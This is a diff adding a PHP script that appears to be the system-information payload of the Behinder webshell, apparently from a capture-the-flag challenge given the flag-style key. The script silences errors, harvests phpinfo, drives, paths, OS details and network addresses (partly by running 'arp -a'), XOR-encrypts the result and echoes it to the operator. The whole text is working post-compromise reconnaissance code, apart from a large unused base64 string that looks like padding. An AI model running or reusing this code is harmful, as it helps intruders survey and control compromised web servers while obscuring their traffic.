@@ -1,0 +1,85 @@
+
+error_reporting(0);
+function main($whatever) {
+    $result = array();
+    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+    $driveList ="";
+    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
+    {
+        for($i=65;$i<=90;$i++)
+    	{
+    		$drive=chr($i).':/';
+    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
+    	}
+    }
+	else
+	{
+		$driveList="/";
+	}
+    $currentPath=getcwd();
+    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
+    $osInfo=PHP_OS;
+    $arch="64";
+    if (PHP_INT_SIZE == 4) {
+        $arch = "32";
+    }
+    $localIp=gethostbyname(gethostname());
+    if ($localIp!=$_SERVER['SERVER_ADDR'])
+    {
+        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
+    }
+    $extraIps=getInnerIP();
+    foreach($extraIps as $ip)
+    {
+        if (strpos($localIp,$ip)===false)
+        {
+         $localIp=$localIp." ".$ip;
+        }
+    }
+    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
+    //echo json_encode($result);
+    $result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode(json_encode($basicInfoObj));
+    //echo json_encode($result);
+    //echo openssl_encrypt(json_encode($result), "AES128", $key);
+    echo encrypt(json_encode($result));
+}
+function getInnerIP()
+{
+$result = array();
+
+if (is_callable("exec"))
+{
+    $result = array();
+    exec('arp -a',$sa);
+    foreach($sa as $s)
+    {
+        if (strpos($s,'---')!==false)
+		{
+			$parts=explode(' ',$s);
+			$ip=$parts[1];
+			array_push($result,$ip);
+		}
+		//var_dump(explode(' ',$s));
+           // array_push($result,explode(' ',$s)[1]);
+    }
+
+}
+
+return $result;
+}
+
+
+function encrypt($data)
+{
+    $key="flag3{Beh1_nder}"; 
+	for($i=0;$i<strlen($data);$i++) {
+    	$data[$i] = $data[$i]^$key[$i%16]; 
+    }
+    $bs="base64_"."encode";
+	$after=$bs($data."");
+    return $after;
+}
+$whatever="S3RXMzNtdHl2dlhKT0tqZW4xRUpJbE0zUGh6TFZNdVdNdlpxZ2FKOFVzVEpTSjZUeDdpcXV0aHpReEoxb1FnajBzd2FLblFHUnVQRlNpdjFTSnczQWdieHVmZDJlNmwwVGhNaUFwc3VyYzlkaVcyUTNxVURoSjBmdmlpdXhFMTFJUk1oWUtvZ1F4TWlXeERnRURiTVNhekJIcDQ1RWhRa3BFS0wxaEh5UmNWZnBNc0tVbnFXY3c3Q0lhd0xmZGExdGIzSDBnZHIybWtJanNTa1I1SGFvR1VjaHc5NEhzclZ3Yk5xV1BnVVhRSGVhQjRzeHZtVk1NRWlvWWxrdm52bll6QTJJaU1iRVdad3pnUWloTUNBVmNiSTBFdTFyMDZsbWVNaURKV1NLbHh3YlBpcDlqMlU3bjZBWlFwSnVKekZRSG5yZUZMalJNWTljRHpYd1g0N0ZKTXQyYjN3TXUwUmJzaGpVUUJlVUt1eWlHck9LWEo5SGkzZmRMYUw3dmpKVGVIMXcwbTJxMnR0bXk0djNtY2Q0Mm1teUg4c3NpSk9rVU13WTN5Zk53eVB5SW9zcFdyUmp0VFlNaWVYYXpvc2t0Rm96MXVzR2IydjAwWlhHTzBwWkpLSkptRjk0N21YWm1Lb3huVEplV0pvamNudlFqR2Q5RGFTc3U2aHRJdDJuZGh6cmxKaXpFcHY1OEdFZlFnV1VOOUE1STVPQTJadE5KZzRqbXdFVnNmd0pLNEFlU3NIbGxLY3ljV2dtbFNualZzZDJ0MTk4WGFoNUNkV3pKRVB4QktWTmhtWUdCSllRUVN0cW4zUFNmOUZrdVBnZk9SQUh6dW1nc0tYdjNBTW81elZ5VFlNOFhrRlNoWWF1d3NMSXlub3VON3RTanBNVnF0NXlWY09sZTl3NDl0eW93blp6YTRnUGlKSktUZFhtT1NPTkFlRVZzaGpGV2sxdUZYMGtGb20ydml5dGgycTVxSWdRZWNkQWVGd21JVlV5eVpCMFJnUWh5VU5tdnlhVEZMQ2VOY05FVTVUb0J4U2h2SEJMMDdONFJJOFI4a0VmdXRJcVlKNHNsYnhzWXA5STkyc2tzMFA0cjFmQk0zdkwyeEN6VlFZRXJOYmRINU5MdHlQdGxiUWZja3hpYmZqbERBbzREWkJDQUhHbUVGNjhDTFhMMGtKcXpHaHBGU1N6YWE1c0owVVhiM0hpSlg3N1pmU0ZqbnNTWmJlRDBuSHNvMW9VbE1oQlVHQXJ6RVhFY09sb0tWN2xaQkhoNVZHdjRFWUlQTDByVW53UWN0Ym5hWU54Q3BoNjY4MHBNVWFsVjRmTDRrTUJiMk9KZmdsNmU0NGhMd2dDN3JDSHBtN0JoYUxibzdaTnlWa25MYnJabEJMcnhyT1pzemtpQ2VSYkZTcG5WVU1STXVwdW56bGlrSlA0Z1hNYk92c3BWNEJWMDBERjFRZFp2aEVubzdwUzVDdEZPb08wT2tWRXVJUEJYYjNhR1ZtZGFZMXllUlVZWk91dlY1RUcyWWNoQURwc3ZlTnA4TVVQS1NuVWNiQ21qSk8zdEdYR1lUQmhET2xTN3g3WkNhZExLTVJ2dURwN3dydHl2dEhucjlSYmR6RHlKMjlhY2RKNHhhSk9jV1FYVEhTN2hkRURYOXJJbzZxa0dpdG9HeEs0ZGVnS1lWRnZXMm11UnRTNXBnN21FenJGZDBiQUVzR2dYRDNVcnFCTDgwOHU5SG9RS1Y0czIzR2xVc3hUSUJ5ZUppaVRoVlFDcTlCalpKOUVlaXZHa2RwWTZSYnpIVDdyZGlteWx4VXlYb1JpVzRVMGFYcHpXRGs2emVYRzlPNnZIM0VzU080dE0wS3ptRXh5RFRvQmNWYkZJaHIxRzg5REpuQnJub2hOTWFWYnpkNWNPbml4Nm92VFQ1SHZNTk82S3BWU2RJUWVqVURiTmtyQ3k4SDJFVEFrMGUxMWxtaElNa1FCVVYwZ2tTemM1WUYwdVVNdkRHVUVNYThMTEtiZE1nVXBqajBwWWQ0SjNIWjlWTHZ4UkpDdEI3SVVGNzVIZFJPTmc2ekZZcU9kcXByQlZTcW5TZXVKdUxUVTdxY2JsU21PblpVMnJuQU5qTTFvWmtZUWsyWHFIR1lVTjV1WUJBSVk1UnN0WmRKeVdiSW1vNVdEdlFCS2FWZTRkNGZieGlSWVljSHFWa3pMaG5ZUVdkSkRJNkd3S0x2TmZtWjdtdWlaOUs3YXN3bEVCc1dpWTVVNlZ1ZjI1T2tXQ0pQUXljV0E1V1lEVDF1TFlWZW9vMGZyVWw5bE13S1lxU2RDbloyUVF3aE9adGlmZ0t5aVRFODJad0hURklvWDdUWnBlNkVDT0tGWjlrQ0lCQkZldDhDUWFyZXR4TE5MYjRZZ1ZiWU5FNXBwN0pqRzFkaGgwQk15U2VmejlHbEZjYUdUNnI1QU14YlA4NUgwR0VtaDNKdjJYYkZmckxLS1ZLMWRvNVZZbVVqYnpUeHc5NWtyT0lZN252azVla2xndWt0R21rbWF1Y0RGdHRjWnM0Q0RlUmx6cWJRVTFZR0pKaUhaT3ptYkU1c3g5UmdjM3Zja24zVndjM0t6ZE9YeUdKQWlBaE1pbVpHcFBBbzJBam15WElYZEs5STZ6a0dHVjdxN3E1UFMxdFZ2b0VMZ0JwenRSckhUSW9sSDg5cWF2TFpxWGtnNWJyaVgxbWZMWEJ4dmJuNmZlZVRqM3h5U3lqcHJjWmZ5UWxadjlqSEd1Um9LWWFOMk9IRXJnTDdMZ0gwNEJiWnA0b1ExZHRXaVNjWnNRRUVaWUViSDJVVnhGd1dyY1QxOVBJV2tCOXBpYm9rVFU2RTlhZWE2MGFsTzlGVWtzNWpBYW5yNUFWOGJyWGx2QmJBcHp6ZnRvM0lCZWdCUnpxTTF0SDEybjdLT1BXcjZqSkF5RkJxeUphaXFpNTFTV2hYZDRhTlM3dWVlYmd1SGxSSmdlaHQ0RWFLREs5U0ZrODBMN3NITDVMT0dGQlcxUzBLU1lWTEZhWm50TTBLamRuc2dveUhJRnpaSTM1VjRscWg4OUVqSzJxRjlTSzNnV0Y2SFRNNTlRWG1CajVDMUhGRG53bTM1TFRIWVQ2ZTFHck1IYkFBdmRraFA=";
+$whatever=base64_decode($whatever);
+main($whatever);
